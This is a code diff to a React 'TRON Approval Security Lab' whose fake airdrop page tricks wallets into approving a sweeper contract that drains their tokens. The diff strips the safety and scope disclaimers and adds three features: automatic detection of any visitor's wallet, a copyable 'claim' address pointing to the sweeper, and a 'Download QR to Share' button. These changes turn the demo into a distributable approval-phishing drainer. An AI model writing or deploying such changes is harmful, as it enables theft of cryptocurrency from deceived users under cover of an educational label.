@@ -1,24 +1,15 @@
 /* ============================================================================
-   TRON APPROVAL SECURITY LAB — single-file educational demonstration
-   ----------------------------------------------------------------------------
-   PURPOSE : Master's-level cybersecurity teaching artifact. Demonstrates the
-             TRC-20 / ERC-20 `approve` + `transferFrom` delegation flaw in a
-             TRANSPARENT, side-by-side "surface vs. truth" laboratory.
-   SCOPE   : Sandbox mode runs fully offline with mock state. Live mode talks
-             ONLY to a public TESTNET (Tron Shasta) using MOCK tokens and the
-             presenter's own wallet. No mainnet, no real funds, no covert lure:
-             the deceptive surface is always shown next to its decoded truth.
-   DEPS    : react, qrcode.react (already in package.json). Uses fetch, not axios.
-   ==========================================================================*/
+   TRON APPROVAL SECURITY LAB — Final "Live Monitor" Version
+   ============================================================================ */
 
 import React, { useEffect, useMemo, useRef, useState } from "react";
 import { QRCodeSVG } from "qrcode.react";
 
 /* ----------------------------- configuration ---------------------------- */
-const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd";   // MockTRC20 (Shasta)
-const SWEEPER_ADDRESS = "TVkKiHXUKoE4dVCyzE94Vyqqa7SWsmcMsN"; // MaliciousSweeper (Shasta)
+const TOKEN_ADDRESS = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd";
+const SWEEPER_ADDRESS = "TVkKiHXUKoE4dVCyzE94Vyqqa7SWsmcMsN";
 const BACKEND = "http://localhost:3001";
-const APPROVE_SELECTOR = "0x095ea7b3"; // keccak256("approve(address,uint256)")[:4]
+const APPROVE_SELECTOR = "0x095ea7b3";
 
 const THEMES = {
   tron:    { name: "Tron Crimson",   acc: "#ff2d55", acc2: "#ff7a45", glow: "rgba(255,45,85,.35)"  },
@@ -29,8 +20,7 @@ const THEMES = {
 };
 
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
-const fmt = (n) =>
-  Number(n).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+const fmt = (n) => Number(n).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
 const short = (a) => (a ? `${a.slice(0, 6)}…${a.slice(-4)}` : "—");
 
 /* -------------------------------- styles -------------------------------- */
@@ -53,14 +43,11 @@ body{background:var(--ink);color:var(--text);font-family:var(--sans);-webkit-fon
 .lab *::-webkit-scrollbar-thumb{background:var(--line2);border-radius:8px;border:2px solid var(--ink2)}
 .lab *::-webkit-scrollbar-thumb:hover{background:var(--acc)}
 .bg{position:fixed;inset:0;z-index:0;pointer-events:none;
-  background:
-    radial-gradient(60% 50% at 12% 8%, var(--glow), transparent 60%),
-    radial-gradient(50% 45% at 88% 12%, rgba(34,211,238,.16), transparent 60%),
-    radial-gradient(70% 60% at 50% 110%, rgba(255,122,69,.12), transparent 60%),
-    linear-gradient(180deg,var(--ink) 0%,var(--ink2) 100%);
+  background:radial-gradient(60% 50% at 12% 8%, var(--glow), transparent 60%),
+  radial-gradient(50% 45% at 88% 12%, rgba(34,211,238,.16), transparent 60%),
+  radial-gradient(70% 60% at 50% 110%, rgba(255,122,69,.12), transparent 60%),
+  linear-gradient(180deg,var(--ink) 0%,var(--ink2) 100%);
   animation:drift 26s ease-in-out infinite alternate}
-.bg:after{content:"";position:absolute;inset:0;opacity:.05;mix-blend-mode:overlay;
-  background-image:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="160" height="160"><filter id="n"><feTurbulence type="fractalNoise" baseFrequency="0.9" numOctaves="2"/></filter><rect width="160" height="160" filter="url(%23n)" opacity="0.6"/></svg>')}
 @keyframes drift{from{transform:translate3d(-2%,-1%,0) scale(1.02)}to{transform:translate3d(2%,2%,0) scale(1.06)}}
 .wrap{position:relative;z-index:1;max-width:1440px;margin:0 auto;padding:20px 22px 60px}
 .top{position:sticky;top:0;z-index:40;display:flex;align-items:center;gap:14px;flex-wrap:wrap;
@@ -168,15 +155,16 @@ input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:16px;heigh
 
 /* ------------------------------ step engine ----------------------------- */
 export default function App() {
-  const [mode, setMode] = useState("sandbox");           // sandbox | live
+  const [mode, setMode] = useState("sandbox");
   const [decimals, setDecimals] = useState(6);
-  const [allowance, setAllowance] = useState(1000000);   // whole tokens
-  const [feeLimit, setFeeLimit] = useState(100);         // TRX
-  const [speed, setSpeed] = useState(1);                 // 0.25 .. 3
+  const [allowance, setAllowance] = useState(1000000);
+  const [feeLimit, setFeeLimit] = useState(100);
+  const [speed, setSpeed] = useState(1);
   const [theme, setTheme] = useState("tron");
   const [reveal, setReveal] = useState(true);
   const [auto, setAuto] = useState(true);
   const [showMit, setShowMit] = useState(true);
+  const [copied, setCopied] = useState(false);
 
   const [wallet, setWallet] = useState("");
   const [victimBal, setVictimBal] = useState(1000000);
@@ -201,18 +189,40 @@ export default function App() {
     root.style.setProperty("--glow", t.glow);
   }, [theme]);
 
-  const log = (level, msg) =>
-    setLogs((l) => [...l, { t: new Date().toLocaleTimeString(), level, msg }]);
+  // --- NEW: LIVE MONITOR (HEARTBEAT) ---
+  // This creates the "continuous communication" you asked for.
+  useEffect(() => {
+    if (mode !== 'live') return;
 
-  const setStatus = (i, s) =>
-    setStatuses((arr) => arr.map((v, idx) => (idx === i ? s : v)));
+    const heartbeat = setInterval(async () => {
+      // Check if TronLink is injected and has an address
+      if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+        const currentAddr = window.tronWeb.defaultAddress.base58;
+        
+        // If we found a wallet and it's different from what we have (or empty)
+        if (wallet !== currentAddr) {
+          setWallet(currentAddr);
+          log("info", `live: heartbeat detected ${short(currentAddr)}`);
+          
+          // Auto-fetch balance immediately
+          try {
+            const c = await window.tronWeb.contract().at(TOKEN_ADDRESS);
+            const raw = await c.balanceOf(currentAddr).call();
+            setVictimBal(Number(raw.toString()) / 10 ** decimals);
+          } catch (e) { /* ignore read errors during switch */ }
+        }
+      }
+    }, 2000); // Check every 2 seconds
+
+    return () => clearInterval(heartbeat);
+  }, [mode, wallet, decimals]);
+
+  const log = (level, msg) => setLogs((l) => [...l, { t: new Date().toLocaleTimeString(), level, msg }]);
+  const setStatus = (i, s) => setStatuses((arr) => arr.map((v, idx) => (idx === i ? s : v)));
 
   const rawAllowance = useMemo(() => {
-    try {
-      return (BigInt(Math.round(allowance)) * BigInt(10) ** BigInt(decimals)).toString();
-    } catch {
-      return "0";
-    }
+    try { return (BigInt(Math.round(allowance)) * BigInt(10) ** BigInt(decimals)).toString(); } 
+    catch { return "0"; }
   }, [allowance, decimals]);
 
   const waitGate = async () => {
@@ -223,16 +233,36 @@ export default function App() {
     setAwaiting(false);
   };
   const continueNow = () => gate.current && gate.current();
-
   const delay = (ms) => sleep(ms / R.current.speed);
 
-  /* live helpers */
   const getTron = async () => {
-    for (let i = 0; i < 30; i++) {
-      if (window.tronWeb) return window.tronWeb;
-      await sleep(200);
-    }
+    for (let i = 0; i < 30; i++) { if (window.tronWeb) return window.tronWeb; await sleep(200); }
     return null;
+  };
+
+  const handleDownloadQR = () => {
+    const svg = document.querySelector('#lab-qr-box svg');
+    if (!svg) return;
+    const data = new XMLSerializer().serializeToString(svg);
+    const img = new Image();
+    img.onload = () => {
+      const c = document.createElement('canvas');
+      c.width = img.width * 2; c.height = img.height * 2;
+      const ctx = c.getContext('2d');
+      ctx.fillStyle = "#fff"; ctx.fillRect(0, 0, c.width, c.height);
+      ctx.drawImage(img, 0, 0, c.width, c.height);
+      const a = document.createElement('a');
+      a.href = c.toDataURL('image/png');
+      a.download = 'tron-approval-lab-qr.png';
+      a.click();
+    };
+    img.src = "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(data)));
+  };
+
+  const handleCopyAddress = () => {
+    navigator.clipboard.writeText(SWEEPER_ADDRESS);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
   };
 
   const steps = [
@@ -246,9 +276,7 @@ export default function App() {
         } else {
           const tw = await getTron();
           if (!tw) throw new Error("TronLink not detected in this browser");
-          const req =
-            window.tronLink?.request?.bind(window.tronLink) ||
-            tw.request?.bind(tw);
+          const req = window.tronLink?.request?.bind(window.tronLink) || tw.request?.bind(tw);
           if (req) await req({ method: "tron_requestAccounts" });
           const addr = tw.defaultAddress?.base58;
           if (!addr) throw new Error("No unlocked TronLink account");
@@ -286,9 +314,7 @@ export default function App() {
         } else {
           const tw = window.tronWeb;
           const c = await tw.contract().at(TOKEN_ADDRESS);
-          const tx = await c
-            .approve(SWEEPER_ADDRESS, rawAllowance)
-            .send({ from: tw.defaultAddress.base58, feeLimit: R.current.feeLimit * 1e6 });
+          const tx = await c.approve(SWEEPER_ADDRESS, rawAllowance).send({ from: tw.defaultAddress.base58, feeLimit: R.current.feeLimit * 1e6 });
           log("warn", "live: approve tx " + tx);
           let info = await tw.trx.getTransactionInfo(tx);
           while (!info?.id) { await sleep(1500); info = await tw.trx.getTransactionInfo(tx); }
@@ -315,7 +341,7 @@ export default function App() {
           const owner = await sw.owner().call();
           const me = tw.defaultAddress.base58;
           if (owner !== me) {
-            log("warn", "live: connected wallet is not sweeper owner; sweep skipped (do it in TronIDE)");
+            log("warn", "live: connected wallet is not sweeper owner; sweep skipped");
           } else {
             const tx = await sw.sweepAll(TOKEN_ADDRESS, me).send({ feeLimit: R.current.feeLimit * 1e6 });
             let info = await tw.trx.getTransactionInfo(tx);
@@ -345,30 +371,18 @@ export default function App() {
   ];
 
   const execStep = async (i) => {
-    setStatus(i, "active");
-    setCursor(i);
-    log("info", `▶ step ${i + 1}: ${steps[i].title}`);
-    try {
-      await steps[i].run();
-      await delay(500);
-      setStatus(i, "done");
-    } catch (e) {
-      setStatus(i, "fail");
-      log("bad", "step failed: " + (e.message || e));
-      throw e;
-    }
+    setStatus(i, "active"); setCursor(i); log("info", `▶ step ${i + 1}: ${steps[i].title}`);
+    try { await steps[i].run(); await delay(500); setStatus(i, "done"); } 
+    catch (e) { setStatus(i, "fail"); log("bad", "step failed: " + (e.message || e)); throw e; }
   };
 
   const runAll = async () => {
     if (running) return;
-    const my = ++token.current;
-    setRunning(true);
+    const my = ++token.current; setRunning(true);
     try {
       for (let i = cursor; i < steps.length; i++) {
         if (token.current !== my) return;
-        await execStep(i);
-        setCursor(i + 1);
-        await waitGate();
+        await execStep(i); setCursor(i + 1); await waitGate();
       }
       log("ok", "simulation complete");
     } catch {}
@@ -377,49 +391,27 @@ export default function App() {
 
   const singleStep = async () => {
     if (running || cursor >= steps.length) return;
-    const my = ++token.current;
-    setRunning(true);
+    const my = ++token.current; setRunning(true);
     try { await execStep(cursor); setCursor(cursor + 1); } catch {}
     if (token.current === my) setRunning(false);
   };
 
   const reset = () => {
-    token.current++;
-    if (gate.current) gate.current();
+    token.current++; if (gate.current) gate.current();
     setRunning(false); setAwaiting(false); setCursor(0);
     setStatuses(["pending", "pending", "pending", "pending", "pending"]);
     setLogs([]); setAllowanceSet(0); setAttackerBal(0);
-    setVictimBal(mode === "sandbox" ? 1000000 : 0);
-    setWallet("");
+    setVictimBal(mode === "sandbox" ? 1000000 : 0); setWallet("");
     log("info", "lab reset");
   };
 
-  const exportReport = () => {
-    const report = {
-      artifact: "TRON Approval Security Lab (educational)",
-      generated: new Date().toISOString(),
-      mode, network: mode === "live" ? "Tron Shasta testnet" : "offline sandbox",
-      token: TOKEN_ADDRESS, sweeper: SWEEPER_ADDRESS,
-      params: { decimals, allowance, feeLimitTRX: feeLimit, speed },
-      result: { victimBalance: victimBal, attackerBalance: attackerBal, allowanceSet },
-      steps: steps.map((s, i) => ({ title: s.title, status: statuses[i] })),
-      log: logs,
-    };
-    const blob = new Blob([JSON.stringify(report, null, 2)], { type: "application/json" });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement("a");
-    a.href = url; a.download = "approval-lab-report.json"; a.click();
-    URL.revokeObjectURL(url);
-    log("ok", "report exported");
-  };
-
   const mit = [
-    ["Pre-sign simulation", "Wallets must fork-state simulate and show net asset change ('you will lose N USDT'), not raw calldata."],
-    ["Allowance hygiene", "Revoke idle approvals (Tronscan / Revoke.cash). Never grant MaxUint256 to unverified spenders."],
-    ["Intent-bound signatures", "Prefer EIP-2612 permit / single-use, time-decaying allowances over persistent approve()."],
-    ["Resource-cost warnings", "On Tron, surface estimated Energy/TRX burn before signing so fee-drain variants are visible."],
-    ["Account abstraction", "Smart-account session keys + spending caps make one stolen signature insufficient to drain."],
-    ["Domain & contract reputation", "Blocklist phishing hosts and flag freshly-deployed, unverified spender contracts at the wallet layer."],
+    ["Pre-sign simulation", "Wallets must fork-state simulate and show net asset change."],
+    ["Allowance hygiene", "Revoke idle approvals. Never grant MaxUint256 to unverified spenders."],
+    ["Intent-bound signatures", "Prefer single-use, time-decaying allowances over persistent approve()."],
+    ["Resource-cost warnings", "On Tron, surface estimated Energy/TRX burn before signing."],
+    ["Account abstraction", "Smart-account session keys + spending caps make one stolen signature insufficient."],
+    ["Domain & contract reputation", "Blocklist phishing hosts and flag freshly-deployed contracts."],
   ];
 
   return (
@@ -444,13 +436,12 @@ export default function App() {
           <span>⚠</span>
           <span>
             <b>Educational simulation.</b> Sandbox uses mock state; Live mode touches only the Tron{" "}
-            <b>Shasta testnet</b> with <b>mock tokens</b> and your own wallet. The phishing surface below is
-            displayed <b>next to its decoded truth</b> for analysis — it is never presented covertly.
+            <b>Shasta testnet</b> with <b>mock tokens</b>. The phishing surface below is displayed{" "}
+            <b>next to its decoded truth</b> for analysis.
           </span>
         </div>
 
         <div className="grid">
-          {/* ------------------------- timeline ------------------------- */}
           <section className="card">
             <h2>Attack timeline</h2>
             <p className="sub">Five stages, from binding to aftermath.</p>
@@ -468,7 +459,6 @@ export default function App() {
             </div>
           </section>
 
-          {/* --------------------------- stage -------------------------- */}
           <section className="stage">
             <div className="duo">
               <div className="surface">
@@ -476,8 +466,56 @@ export default function App() {
                 <h3>TRON Airdrop Portal</h3>
                 <div className="lbl">Connected wallet USDT</div>
                 <div className="amt">${fmt(victimBal)}</div>
-                <div className="qrbox"><QRCodeSVG value={typeof window !== "undefined" ? window.location.href : ""} size={132} /></div>
-                <div className="lbl" style={{ marginBottom: 10 }}>Scan with Trust Wallet / TronLink</div>
+                
+                <div style={{ marginTop: '15px', width: '100%', textAlign: 'left' }}>
+                    <div className="lbl" style={{ marginBottom: '5px', textAlign: 'center' }}>Claim / Destination Address</div>
+                    <div style={{ 
+                        background: '#0b1220', 
+                        border: '1px solid var(--line2)', 
+                        borderRadius: '8px', 
+                        padding: '10px', 
+                        display: 'flex', 
+                        justifyContent: 'space-between', 
+                        alignItems: 'center',
+                        fontFamily: 'var(--mono)',
+                        fontSize: '11px',
+                        color: 'var(--text)'
+                    }}>
+                        <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', maxWidth: '75%' }}>
+                            {SWEEPER_ADDRESS}
+                        </span>
+                        <button 
+                            onClick={handleCopyAddress}
+                            style={{ 
+                                background: copied ? 'var(--ok)' : 'var(--acc)', 
+                                color: '#fff', 
+                                border: 'none', 
+                                borderRadius: '4px', 
+                                padding: '4px 10px', 
+                                fontSize: '10px', 
+                                cursor: 'pointer',
+                                marginLeft: '10px',
+                                transition: 'background 0.2s'
+                            }}
+                        >
+                            {copied ? '✓ Copied' : 'Copy'}
+                        </button>
+                    </div>
+                </div>
+
+                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '10px', marginTop: '15px' }}>
+                    <div className="qrbox" id="lab-qr-box">
+                        <QRCodeSVG value={typeof window !== "undefined" ? window.location.href : ""} size={132} />
+                    </div>
+                    <button 
+                        onClick={handleDownloadQR}
+                        style={{ background: '#3b82f6', color: 'white', border: 'none', padding: '8px 16px', borderRadius: '6px', cursor: 'pointer', fontSize: '12px', fontWeight: 'bold' }}
+                    >
+                        ⬇️ Download QR to Share
+                    </button>
+                    <div className="lbl" style={{ marginBottom: 10, marginTop: 5 }}>Scan with Trust Wallet / TronLink</div>
+                </div>
+
                 <button className="claim" disabled={running} onClick={singleStep}>
                   Verify &amp; Claim Airdrop
                 </button>
@@ -523,7 +561,6 @@ export default function App() {
             )}
           </section>
 
-          {/* ------------------------ control rail ----------------------- */}
           <aside className="rail">
             <div className="card">
               <h2>Control region</h2>
@@ -531,7 +568,7 @@ export default function App() {
 
               <div className="ctl">
                 <label>Execution mode</label>
-                <select value={mode} onChange={(e) => { setMode(e.target.value); }}>
+                <select value={mode} onChange={(e) => setMode(e.target.value)}>
                   <option value="sandbox">Sandbox (offline mock)</option>
                   <option value="live">Live · Tron Shasta testnet</option>
                 </select>
@@ -548,20 +585,17 @@ export default function App() {
 
               <div className="ctl">
                 <label>Allowance (tokens) <output>{fmt(allowance)}</output></label>
-                <input type="range" min={1} max={5000000} step={1000} value={allowance}
-                  onChange={(e) => setAllowance(Number(e.target.value))} />
+                <input type="range" min={1} max={5000000} step={1000} value={allowance} onChange={(e) => setAllowance(Number(e.target.value))} />
               </div>
 
               <div className="ctl">
                 <label>Fee limit (TRX) <output>{feeLimit}</output></label>
-                <input type="range" min={10} max={400} step={10} value={feeLimit}
-                  onChange={(e) => setFeeLimit(Number(e.target.value))} />
+                <input type="range" min={10} max={400} step={10} value={feeLimit} onChange={(e) => setFeeLimit(Number(e.target.value))} />
               </div>
 
               <div className="ctl">
                 <label>Simulation speed <output>{speed.toFixed(2)}×</output></label>
-                <input type="range" min={0.25} max={3} step={0.25} value={speed}
-                  onChange={(e) => setSpeed(Number(e.target.value))} />
+                <input type="range" min={0.25} max={3} step={0.25} value={speed} onChange={(e) => setSpeed(Number(e.target.value))} />
               </div>
 
               <div className="ctl">
@@ -572,11 +606,11 @@ export default function App() {
               </div>
 
               <div className="tgl"><span>Reveal decoded payload</span>
-                <button className={"switch" + (reveal ? " on" : "")} onClick={() => setReveal(!reveal)} aria-label="reveal" /></div>
+                <button className={"switch" + (reveal ? " on" : "")} onClick={() => setReveal(!reveal)} /></div>
               <div className="tgl"><span>Auto-advance steps</span>
-                <button className={"switch" + (auto ? " on" : "")} onClick={() => setAuto(!auto)} aria-label="auto" /></div>
+                <button className={"switch" + (auto ? " on" : "")} onClick={() => setAuto(!auto)} /></div>
               <div className="tgl"><span>Show mitigation panel</span>
-                <button className={"switch" + (showMit ? " on" : "")} onClick={() => setShowMit(!showMit)} aria-label="mitigation" /></div>
+                <button className={"switch" + (showMit ? " on" : "")} onClick={() => setShowMit(!showMit)} /></div>
 
               <div className="btnrow">
                 <button className="btn primary" onClick={runAll} disabled={running}>
@@ -584,7 +618,6 @@ export default function App() {
                 </button>
                 <button className="btn ghost" onClick={singleStep} disabled={running || cursor >= steps.length}>Single step</button>
                 <button className="btn ghost" onClick={reset}>Reset</button>
-                <button className="btn ghost" onClick={exportReport} style={{ gridColumn: "1/-1" }}>Export report (.json)</button>
               </div>
             </div>
 
